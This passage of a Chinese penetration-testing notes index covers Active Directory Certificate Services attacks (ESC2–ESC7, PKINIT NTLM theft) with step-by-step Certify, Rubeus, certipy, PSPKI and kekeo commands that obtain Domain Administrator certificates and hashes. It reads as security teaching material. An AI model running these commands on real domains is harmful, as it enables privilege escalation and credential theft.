\u6307\u8bc1\u4e66\u6ca1\u6709 EKU\uff0c\u76f8\u5f53\u4e8e\u4ece\u5c5e CA \u7684\u8bc1\u4e66\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u5177\u6709 Any Purpose EKU \u7684\u8bc1\u4e66\u7528\u4e8e\u4efb\u4f55\u76ee\u7684\uff0c\u8fd9\u5305\u62ec\u5ba2\u6237\u7aef\u8eab\u4efd\u9a8c\u8bc1\u3001\u670d\u52a1\u5668\u8eab\u4efd\u9a8c\u8bc1\u3001\u4ee3\u7801\u7b7e\u540d\u7b49\u3002\u53ef\u4ee5\u7528\u4e8e\u83b7\u53d6tgt\u8fdb\u884c\u6301\u4e45\u5316\u7b49\u64cd\u4f5c\uff0c\u611f\u89c9\u5371\u5bb3\u5ea6\u6ca1esc1\u9ad8 Certify.exe find /vulnerable Misconfigured Enrollment Agent Templates - ESC3 \u6ee5\u7528eku\u4e2d\u7684\u201c\u6ce8\u518c\u4ee3\u7406\u201d \u5bfc\u81f4\u7684\u6743\u9650\u63d0\u5347\u3002 \u6ce8\u518c\u4ee3\u7406\uff1a\u5141\u8bb8\u59d4\u6258\u4eba\u4ee3\u8868\u53e6\u4e00\u4e2a\u7528\u6237\u6ce8\u518c\u8bc1\u4e66\u3002 \u5b8c\u6210\u6b64\u653b\u51fb\uff0cCA \u9700\u8981\u81f3\u5c11\u4ee5\u4e0b\u4e24\u7ec4\u5339\u914d\u6761\u4ef6\u7684\u8bc1\u4e66\u6a21\u677f\uff1a \u6761\u4ef61: \u5141\u8bb8\u4f4e\u6743\u9650\u7528\u6237\u6ce8\u518c\u4ee3\u7406\u8bc1\u4e66\u3002 \u4f01\u4e1a CA \u6388\u4e88\u4f4e\u7279\u6743\u7528\u6237\u6ce8\u518c\u6743\u9650\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 CA \u8bc1\u4e66\u7ba1\u7406\u7a0b\u5e8f\u6279\u51c6\u88ab\u7981\u7528\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u65e0\u9700\u6388\u6743\u7b7e\u540d\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u8fc7\u4e8e\u5bbd\u677e\u7684\u8bc1\u4e66\u6a21\u677f\u5b89\u5168\u63cf\u8ff0\u7b26\u4f1a\u5411\u4f4e\u7279\u6743\u7528\u6237\u6388\u4e88\u8bc1\u4e66\u6ce8\u518c\u6743\u9650\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u8bc1\u4e66\u6a21\u677f\u5b9a\u4e49\u4e86\u8bc1\u4e66\u7533\u8bf7\u4ee3\u7406 EKU\u3002\u8bc1\u4e66\u7533\u8bf7\u4ee3\u7406 OID\uff081.3.6.1.4.1.311.20.2.1\uff09\u5141\u8bb8\u4ee3\u8868\u5176\u4ed6\u4e3b\u4f53\u8bf7\u6c42\u5176\u4ed6\u8bc1\u4e66\u6a21\u677f\u3002 \u6761\u4ef6 2\uff1a \u53e6\u4e00\u4e2a\u6a21\u677f\u9700\u8981\u5141\u8bb8\u4f4e\u6743\u9650\u7528\u6237\u4f7f\u7528\u6ce8\u518c\u4ee3\u7406\u8bc1\u4e66\u4ee3\u8868\u53e6\u4e00\u4e2a\u7528\u6237\u6765\u8bf7\u6c42\u8bc1\u4e66\uff0c\u5e76\u4e14\u8be5\u6a21\u677f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5141\u8bb8\u57df\u8eab\u4efd\u9a8c\u8bc1\u7684 EKU\u3002 \u4f01\u4e1a CA \u6388\u4e88\u4f4e\u7279\u6743\u7528\u6237\u6ce8\u518c\u6743\u9650\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 CA \u8bc1\u4e66\u7ba1\u7406\u7a0b\u5e8f\u6279\u51c6\u88ab\u7981\u7528\u3002\u7ec6\u8282\u4e0e ESC1 \u76f8\u540c\u3002 \u6a21\u677f\u67b6\u6784\u7248\u672c 1 \u6216\u5927\u4e8e 2 \u5e76\u5728\u53d1\u5e03\u8981\u6c42\u4e2d\u6307\u5b9a\u4e86\u9700\u8981\u8bc1\u4e66\u7533\u8bf7\u4ee3\u7406 EKU \u7684\u5e94\u7528\u7a0b\u5e8f\u7b56\u7565\u3002\u5173\u4e8e\u53d1\u5e03\u8981\u6c42\u7684\u7ec6\u8282\u53ef\u4ee5\u53c2\u8003\u524d\u6587\u3002 \u8bc1\u4e66\u6a21\u677f\u5b9a\u4e49\u4e86\u542f\u7528\u57df\u8eab\u4efd\u9a8c\u8bc1\u7684 EKU\u3002 \u6ce8\u518c\u4ee3\u7406\u9650\u5236\u672a\u5728 CA \u4e0a\u5b9e\u65bd\u3002 \u4ee5\u4e0b\u662f\u5339\u914d\u6761\u4ef6 1 \u7684\u6a21\u677f\u7684\u793a\u4f8b\uff1a \u4ee5\u4e0b\u662f\u5339\u914d\u6761\u4ef6 2 \u7684\u6a21\u677f\u7684\u793a\u4f8b\uff1a \u5148\u8bf7\u6c42\u6ce8\u518c\u4ee3\u7406\u8bc1\u4e66\uff08\u6761\u4ef61\u6a21\u7248\uff09 Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:Vuln-EnrollmentAgent \u5c06\u5f97\u5230\u7684\u6ce8\u518c\u4ee3\u7406\u8bc1\u4e66\u4f7f\u7528 openssl \u8f6c\u6362\u4e3a .pfx \u683c\u5f0f\uff0c\u7136\u540e\uff0c\u7528\u5b83\u6765\u4ee3\u8868\u53e6\u4e00\u4e2a\u7528\u6237\uff08\u4f8b\u5982\u57df\u7ba1\u7406\u5458\u7528\u6237\uff09\u5411\u5141\u8bb8\u57df\u8eab\u4efd\u9a8c\u8bc1\u7684\u6a21\u677f\u53d1\u51fa\u8bc1\u4e66\u6ce8\u518c\u8bf7\u6c42\uff0c\u76f8\u5173\u547d\u4ee4\u5982\u4e0b\u3002 Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:Vuln-EnrollmentAgent-AuthorizedSignatures /onbehalfof:PENTEST\\Administrator /enrollcert:Vuln-EnrollmentAgentCert.pfx /enrollcertpw:Passw0rd \u5982\u4e0a\u56fe\u6240\u793a\uff0c\u6210\u529f\u4e3a\u57df\u7ba1\u7406\u5458\u7528\u6237 Administrator \u6ce8\u518c\u4e86\u4e00\u4e2a\u8bc1\u4e66\u3002\u5728\u4f7f\u7528 openssl \u8f6c\u6362\u4e3a .pfx \u683c\u5f0f\u540e\uff0c\u8fd9\u4e2a\u8bc1\u4e66\u5141\u8bb8\u6211\u4eec\u901a\u8fc7\u4ee5 Administrator \u7684\u8eab\u4efd\u8bf7\u6c42\u4e00\u4e2a TGT Rubeus.exe asktgt /user:Administrator /certificate:C:\\Users\\Marcus\\cert.pfx /password:Passw0rd /ptt Vulnerable Certificate Template Access Control - ESC4 \u5982\u679c\u7528\u6237\u5bf9ca\u6a21\u7248\u6709\u9ad8\u6743\u9650acl\uff0c\u5c31\u53ef\u4ee5\u5e72\u5f88\u591a\u574f\u4e8b\u3002 \u4f8b\u5b50\uff1a\u5982\u679c\u653b\u51fb\u8005\u5bf9\u6a21\u677f\u5bf9\u8c61\u62e5\u6709 WriteProperty \u6743\u9650\uff0c\u5219\u5176\u53ef\u4ee5\u4fee\u6539\u6a21\u677f AD \u5bf9\u8c61\u5c5e\u6027\uff0c\u5219\u4ed6\u4eec\u53ef\u4ee5\u76f4\u63a5\u5c06\u9519\u8bef\u914d\u7f6e\u63a8\u9001\u5230\u4e0d\u6613\u53d7\u653b\u51fb\u7684\u6a21\u677f\uff0c\u4f8b\u5982\u901a\u8fc7\u4e3a\u5141\u8bb8\u57df\u8eab\u4efd\u9a8c\u8bc1\u7684\u6a21\u677f\u5728 mspki-certificate-name-flag \u5c5e\u6027\u4e2d\u542f\u7528 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT \u6807\u5fd7\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u4e0e \u201cMisconfigured Certificate Templates - ESC1\u201d \u76f8\u540c\u7684\u6ee5\u7528\u573a\u666f\u3002 Certify \u7684 find \u547d\u4ee4\u4f1a\u679a\u4e3e\u6240\u6709\u8bc1\u4e66\u6a21\u677f\u7684\u8bbf\u95ee\u63a7\u5236\u6761\u76ee\uff08BloodHound \u56e2\u961f\u4e5f\u5728\u79ef\u6781\u96c6\u6210\u6b64\u7c7b\u679a\u4e3e\uff09\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002 Certify.exe find \u53ef\u89c1\u6a21\u7248\u5c5e\u6027\u53ef\u88ab\u4fee\u6539 \u770b\u770b\u5177\u4f53\u53ef\u4ee5\u4fee\u6539\u54ea\u4e9b\u6761\u76ee Import-Module ActiveDirectory (Get-Acl -Path \"AD:CN=user,CN=certificate templates,CN=public key services,CN=services,CN=configuration,DC=ez,DC=lab\").Access objectType\u663e\u793a\u7684\u662f\u53ef\u4ee5\u4fee\u6539\u7684\u5c5e\u6027\u3002\u5982\u679c\u662fmsPKI-Certificate-Name-Flag\u7684guid\u5c31\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e86. \u5982\u679cobjectType\u5168\u662f0\uff0c\u5219\u8868\u793a\u4efb\u610f\u5c5e\u6027\u5747\u53ef\u4fee\u6539\u3002 \u6dfb\u52a0esc1\u4e2d\u7684\u654f\u611f\u6761\u76ee\uff1a https://github.com/ly4k/Certipy certify python\u7248+\u5f3a\u5316\u7248 #\u4fdd\u7559\u65e7ESC4\u6a21\u677f\u914d\u7f6e\u5e76\u4fee\u6539ESC4\u6a21\u677f certipy template -u hack@lhc.local -p 123@Qwe -template ESC4_1 -save-old #\u5229\u7528\u65b0ESC4\u8bc1\u4e66\u6a21\u677f\u7533\u8bf7\u8bc1\u4e66 certipy req -u hack@lhc.local -p 123@Qwe -ca Lhc-CS2016-CA -target-ip 10.211.55.20 -template ESC4_1 -upn administrator@lhc.local #\u8eab\u4efd\u9a8c\u8bc1 certipy auth -pfx administrator.pfx -dc-ip 10.211.55.18 #\u6a21\u677f\u590d\u539f certipy template -u hack@lhc.local -p 123@Qwe -template ESC4 -configuration ESC4.json \u6216\u8005 https://github.com/fortalice/modifyCertTemplate \u8fd9\u4e2a\u5de5\u5177\u8fd8\u53ef\u4ee5\u67e5\u770b\u6a21\u7248\u7684\u5c5e\u6027\u4ee5\u53caacl\uff0c\u6bd4\u8f83\u7efc\u5408 python3 modifyCertTemplate.py -template KerberosAuthentication -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag ez.lab/administrator:pass \u7136\u540e\u53c2\u7167esc1\u8fdb\u884c\u653b\u51fb\u5373\u53ef\u3002 CA EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 \u7684\u6ee5\u7528\u6765\u542f\u7528 SAN (\u4e3b\u9898\u5907\u7528\u540d)\uff0c\u4ece\u800c\u5141\u8bb8\u7528\u6237\u5728\u7533\u8bf7\u8bc1\u4e66\u65f6\u8bf4\u660e\u81ea\u5df1\u8eab\u4efd\uff0c\u4ece\u800c\u8fbe\u5230\u4e0e\u542f\u7528 \u201cMisconfigured Certificate Templates - ESC1\u201d \u4e2d\u6240\u8ff0\u7684\u5371\u5bb3\u4e00\u6837 \u4e0eEDITF_ATTRIBUTESUBJECTALTNAME2 \u6709\u5173,\u5f00\u542f\u547d\u4ee4 #\u5f00\u542fEDITF_ATTRIBUTESUBJECTALTNAME2 certutil -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2 #\u91cd\u542fcertsvc\u670d\u52a1 net stop certsvc net start certsvc \u4f01\u4e1a CA \u6388\u4e88\u4f4e\u6743\u9650\u7528\u6237\u8bf7\u6c42\u6743\u9650\uff08\u9ed8\u8ba4\uff09\uff1b \u6a21\u677f\u4e2d CA \u7ba1\u7406\u5458\u5ba1\u6279\u672a\u542f\u7528\uff08\u9ed8\u8ba4\uff09\uff1b \u6a21\u677f\u4e2d\u4e0d\u9700\u8981\u6388\u6743\u7684\u7b7e\u540d\uff08\u9ed8\u8ba4\uff09\uff1b CA+EDITF_ATTRIBUTESUBJECTALTNAME2\uff08\u4ee5\u4e0b\u4e3a\u5f00\u542f\u547d\u4ee4\uff09 Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:User /altname:PENTEST\\Administrator \u83b7\u5f97admin\u7684\u8bc1\u4e66 Vulnerable Certificate Authority Access Control - ESC7 \u8bc1\u4e66\u9881\u53d1\u673a\u6784\u4e5f\u6709\u4e00\u4e9bacl\uff0c\u666e\u901a\u7528\u6237\u62e5\u6709\u8fd9\u4e9b\u6743\u9650\u4e5f\u80fd\u8fdb\u884c\u57df\u6743\u9650\u63d0\u5347 \u8fd9\u91cc\u7684\u4e24\u4e2a\u4e3b\u8981\u6743\u9650\u662f \u201c\u7ba1\u7406 CA\u201d\uff08ManageCA\uff09\u6743\u9650\u548c \u201c\u9881\u53d1\u548c\u7ba1\u7406\u8bc1\u4e66\u201d\uff08ManageCertificates\uff09\u6743\u9650\uff0c\u62e5\u6709\u8fd9\u4e24\u4e2a\u6743\u9650\u7684\u7528\u6237\u5206\u522b\u5bf9\u5e94\u4e8e \u201cCA \u7ba1\u7406\u5458\u201d \u548c \u201c\u8bc1\u4e66\u7ba1\u7406\u5458\u201d\uff08\u6709\u65f6\u79f0\u4e3a CA \u5b98\u5458\uff09\u3002 1.\u5bf9\u4e8e\u201c\u7ba1\u7406 CA\u201d\uff08ManageCA\uff09\u6743\u9650 Import-Module -Name PSPKI Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-CertificationAuthorityAcl | select -expand Access \u5f00\u542f EDITF_ATTRIBUTESUBJECTALTNAME2 \u4f4d\u4ee5\u5141\u8bb8\u5728\u4efb\u4f55\u6a21\u677f\u6ce8\u518c\u8bf7\u6c42\u4e2d\u8bbe\u7f6e SAN\uff0c\u7528\u4e8e\u5b8c\u6210esc6\u653b\u51fb Import-Module PSPKI $ConfigReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD \"DC01.pentest.com\" $ConfigReader.SetRootNode($true) $ConfigReader.GetConfigEntry(\"EditFlags\", \"PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\") $ConfigReader.SetConfigEntry(1376590, \"PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\") 2.\u5bf9\u4e8e \u201c\u9881\u53d1\u548c\u7ba1\u7406\u8bc1\u4e66\u201d\uff08ManageCertificates\uff09\u6743\u9650 \u4e00\u4e2a\u540d\u4e3a \u201cApproveReqTemplate\u201d \u7684\u6a21\u677f\uff0c\u5176\u5141\u8bb8\u57df\u8eab\u4efd\u9a8c\u8bc1\u5e76\u4e14\u5728 mspki-certificate-name-flag \u5c5e\u6027\u4e2d\u8bbe\u7f6e\u4e86 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT \u6807\u5fd7\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u524d\u6587 \u201cMisconfigured Certificate Templates - ESC1\u201d \u7684\u65b9\u6cd5\u4e3a\u57df\u7ba1\u7406\u5458\u7684\u7533\u8bf7\u8bc1\u4e66\uff0c\u4f46\u662f\u8be5\u6a21\u677f\u5728\u53d1\u5e03\u8981\u6c42\u4e2d\u5f00\u542f\u4e86 \u201cCA \u8bc1\u4e66\u7ba1\u7406\u7a0b\u5e8f\u6279\u51c6(C)\u201d \u4fdd\u62a4\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002 \u90a3\u4e48\u6211\u4eec\u6240\u6709\u9488\u5bf9\u8be5\u6a21\u677f\u7684\u6ce8\u518c\u8bf7\u6c42\u90fd\u5c06\u88ab\u6302\u8d77\uff0c\u76f4\u5230\u7ba1\u7406\u5458\u5728 certsrv.msc \u7684 \u201c\u6302\u8d77\u7684\u7533\u8bf7\u201d \u4e2d\u5bf9\u8be5\u8bf7\u6c42\u4e88\u4ee5 \u201c\u9881\u53d1\u201d \u6216 \u201c\u62d2\u7edd\u201d\u3002 \u4f46\u662f\u5982\u679c\u6211\u4eec\u6709ManageCertificates\u6743\u9650\uff08\u67e5\u8be2\u547d\u4ee4\u5982\u4e0b\uff09\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u81ea\u4e3b\u8ba9\u8be5\u7533\u8bf7\u901a\u8fc7 Import-Module -Name PSPKI Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-CertificationAuthorityAcl | select -expand Access \u7167\u6837\u8bf7\u6c42\u8bc1\u4e66\uff0c\u56e0\u4e3a\u6ce8\u518c\u88ab\u6302\u8d77\uff0c\u6211\u4eec\u53ea\u80fd\u83b7\u5f97\u4e00\u4e2arequest id Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /template:ApproveReqTemplate /altname:PENTEST\\Administrator \u518d\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u8ba9\u7533\u8bf7\u901a\u8fc7\uff08request id \u4e3a56\u7684\u7533\u8bf7\u901a\u8fc7\uff09 Import-Module PSPKI Get-CertificationAuthority -ComputerName dc01.pentest.com | Get-PendingRequest -RequestID 56 | Approve-CertificateRequest \u518d\u6b21\u7533\u8bf7\u8bc1\u4e66\uff0c\u6307\u5b9arequest id\u4e3a\u5148\u524d\u768456\uff0c\u5373\u53ef\u83b7\u5f97admin\u8bc1\u4e66 Certify.exe request /ca:DC01.pentest.com\\pentest-DC01-CA /id:56 \u57df\u6743\u9650\u7ef4\u6301","title":"ADCS\u5b89\u5168\u95ee\u9898"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#adcs","text":"","title":"ADCS\u5b89\u5168\u95ee\u9898"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#_1","text":"\u67e5\u770b\u8bc1\u4e66\u6a21\u7248 \u8bc1\u4e66\u8eab\u4efd\u9a8c\u8bc1 \u679a\u4e3eca \u653b\u51fb \u8bc1\u4e66\u7a83\u53d6 NTLM Credential Theft via PKINIT \u2013 THEFT5 \u6743\u9650\u7ef4\u6301 Active User Credential Theft via Certificates \u2013 PERSIST1 Machine Persistence via Certificates - PERSIST2 \u57df\u6743\u9650\u63d0\u5347 Misconfigured Certificate Templates - ESC1 Misconfigured Certificate Templates - ESC2 Misconfigured Enrollment Agent Templates - ESC3 Vulnerable Certificate Template Access Control - ESC4 CA EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6 Vulnerable Certificate Authority Access Control - ESC7 \u57df\u6743\u9650\u7ef4\u6301 Active Directory Certificate Services \u8bc1\u4e66\u670d\u52a1\u3002ADCS \u5e76\u4e0d\u662f\u9ed8\u8ba4\u5b89\u88c5\u4f46\u5728\u5927\u578b\u4f01\u4e1a\u57df\u4e2d\u901a\u5e38\u88ab\u5e7f\u6cdb\u90e8\u7f72 adcs\u5927\u91cf\u653b\u51fb\u9762\u5b58\u5728\u4e8e\u8bc1\u4e66\u6a21\u7248\u4e2d\uff0c\u5b58\u50a8\u4e3a CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=,DC= \uff0c","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#_2","text":"\u67e5\u770b\u67d0\u4e2a\u7528\u6237\u6216\u7528\u6237\u7ec4\u5bf9\u67d0\u4e2a\u8bc1\u4e66\u6a21\u7248\u62e5\u6709\u7684\u6743\u9650 Import-Module ActiveDirectory cd AD: $Acl = Get-Acl 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=pentest,DC=com' $Acl.Access.Count $Acl.Access | where IdentityReference -match 'Domain Users' \u6216\u8005 certtmpl.msc \uff0c\u53f3\u952e\u70b9\u51fb \u201c\u6a21\u677f\u201d\uff0c\u9009\u62e9 \u201c\u5c5e\u6027\u201d\uff0c\u7136\u540e\u67e5\u770b \u201c \u5b89\u5168\u201d \u9009\u9879\u5361 \u6216\u8005certsrv.msc\uff0c\u53f3\u952e\u5355\u51fb\u9009\u4e2d\u7684 CA\uff0c\u9009\u62e9 \u201c\u5c5e\u6027\u201d\uff0c\u7136\u540e\u67e5\u770b \u201c \u5b89\u5168\u201d \u9009\u9879\u5361","title":"\u67e5\u770b\u8bc1\u4e66\u6a21\u7248"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#_3","text":"AD \u9ed8\u8ba4\u652f\u6301\u4e24\u79cd\u534f\u8bae\u7684\u8bc1\u4e66\u8eab\u4efd\u9a8c\u8bc1\uff1aKerberos \u534f\u8bae\u548c\u5b89\u5168\u4fe1\u9053\uff08Secure Channel\uff0cSchannel\uff09\u3002 PKINT\uff08Public Key Cryptography for Initial Authentication \uff0c\u201c\u7528\u4e8e\u521d\u59cb\u8ba4\u8bc1\u7684\u516c\u94a5\u5bc6\u7801\u4f53\u5236\u201d\uff09\u88ab\u7528\u4e8ekerberos\u534f\u8bae\u4e2d\u5b9a\u4e49\u8bc1\u4e66\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u3002 Secure Channel\uff08Schannel\uff09\u662f Windows \u5728\u5efa\u7acb TLS/SSL \u8fde\u63a5\u65f6\u5229\u7528\u7684 SSP\u3002Schannel \u652f\u6301\u5ba2\u6237\u7aef\u8eab\u4efd\u9a8c\u8bc1\uff08\u4ee5\u53ca\u8bb8\u591a\u5176\u4ed6\u529f\u80fd\uff09\uff0c\u4f7f\u8fdc\u7a0b\u670d\u52a1\u5668\u80fd\u591f\u9a8c\u8bc1\u8fde\u63a5\u7528\u6237\u7684\u8eab\u4efd\u3002\u5b83\u4f7f\u7528 PKI \u5b8c\u6210\u6b64\u64cd\u4f5c\uff0c\u8bc1\u4e66\u662f\u4e3b\u8981\u51ed\u636e\u3002\u5728 TLS \u63e1\u624b\u671f\u95f4\uff0c\u670d\u52a1\u5668\u8981\u6c42\u5ba2\u6237\u7aef\u8bf7\u63d0\u4f9b\u8bc1\u4e66\u4ee5\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u5ba2\u6237\u7aef\u5148\u524d\u5df2\u4ece\u670d\u52a1\u5668\u4fe1\u4efb\u7684 CA \u9881\u53d1\u5ba2\u6237\u7aef\u8eab\u4efd\u9a8c\u8bc1\u8bc1\u4e66\uff0c\u7136\u540e\u5c06\u5176\u8bc1\u4e66\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002\u7136\u540e\uff0c\u670d\u52a1\u5668\u9a8c\u8bc1\u8bc1\u4e66\u662f\u5426\u6b63\u786e\uff0c\u5e76\u5728\u4e00\u5207\u6b63\u5e38\u7684\u60c5\u51b5\u4e0b\u6388\u4e88\u7528\u6237\u8bbf\u95ee\u6743\u9650\u3002","title":"\u8bc1\u4e66\u8eab\u4efd\u9a8c\u8bc1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#ca","text":"\u5982\u679c\u60f3\u8981\u679a\u4e3e\u4f01\u4e1a CA \u53ca\u5176\u8bbe\u7f6e\uff0c\u53ef\u4ee5\u4ee5 CN=Configuration,DC=<DOMAIN>,DC=<COM> \u4e3a BaseDN\uff0c\u4ee5 (objectCategory=pKIEnrollmentService) \u4e3a\u8fc7\u6ee4\u5668\u67e5\u8be2 LDAP\u3002\u7ed3\u679c\u5c06\u8bc6\u522b CA \u670d\u52a1\u5668\u7684 DNS \u4e3b\u673a\u540d\u3001CA \u540d\u79f0\u672c\u8eab\u3001\u8bc1\u4e66\u5f00\u59cb\u548c\u7ed3\u675f\u65e5\u671f\u3001\u5404\u79cd\u6807\u5fd7\u3001\u5df2\u53d1\u5e03\u7684\u8bc1\u4e66\u6a21\u677f\u7b49\u5404\u79cd\u5c5e\u6027\u4fe1\u606f\u3002 $baseDN = \"CN=Configuration,DC=<DOMAIN>,DC=<COM>\" $filter = \"(objectCategory=pKIEnrollmentService)\" Get-ADObject -SearchBase $baseDN -LDAPFilter $filter Certify \u53ef\u4ee5\u679a\u4e3e\u6709\u5173 AD CS \u73af\u5883\u7684\u6709\u7528\u914d\u7f6e\u548c\u57fa\u7840\u7ed3\u6784\u4fe1\u606f\uff0c\u4f7f\u7528\u5176 cas \u547d\u4ee4\u53ef\u4ee5\u679a\u4e3e\u53d7\u4fe1\u4efb\u7684\u6839 CA \u8bc1\u4e66\u3001\u7531 NTAuthCertificates \u5bf9\u8c61\u5b9a\u4e49\u7684\u8bc1\u4e66\u4ee5\u53ca\u6709\u5173\u4f01\u4e1a CA \u7684\u5404\u79cd\u4fe1\u606f\uff1a https://github.com/GhostPack/Certify Certify.exe cas \u8981\u83b7\u53d6\u6709\u5173\u6bcf\u4e2a\u53ef\u7528\u8bc1\u4e66\u6a21\u677f\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u53ef\u4ee5\u4f7f\u7528 certutil -v -dstemplate \u547d\u4ee4","title":"\u679a\u4e3eca"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#_4","text":"","title":"\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#_5","text":"","title":"\u8bc1\u4e66\u7a83\u53d6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#ntlm-credential-theft-via-pkinit-theft5","text":"\u5f53\u4f7f\u7528\u8bc1\u4e66\u8fdb\u884c Kerberos PKINIT \u8eab\u4efd\u9a8c\u8bc1\u7684\u65f6\u5019\uff0c\u8fd4\u56de\u7684\u7968\u636e\u7684 PAC \u5305\u91cc\u9762\u5305\u542b\u7528\u6237\u7684 NTLM \u51ed\u636e\u3002\u83b7\u53d6\u8fd9\u4e2a NTLM \u51ed\u636e\u6d89\u53ca\u89e3\u5bc6 PAC_CREDENTIAL_DATA \u7ed3\u6784\uff0cmimikatz\u548ckekeo\u5b9e\u73b0\u4e86\u8be5\u70b9\u3002 kekeo.exe \"tgt::pac /caname:pentest-DC01-CA /subject:Marcus /castore:current_user /domain:pentest.com\" exit \u5373\u4f7f\u7528\u6237\u5c06\u5bc6\u7801\u6539\u4e86\uff0c\u901a\u8fc7\u8bc1\u4e66\u4e5f\u968f\u65f6\u90fd\u53ef\u4ee5\u83b7\u53d6 NTLM","title":"NTLM Credential Theft via PKINIT \u2013 